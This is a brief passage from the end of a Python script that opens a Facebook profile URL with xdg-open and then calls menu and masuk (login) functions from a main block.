	os.system('xdg-open https://m.facebook.com/cindy.adelia.330')
	menu()




if __name__=='__main__':
        menu()
        masuk()
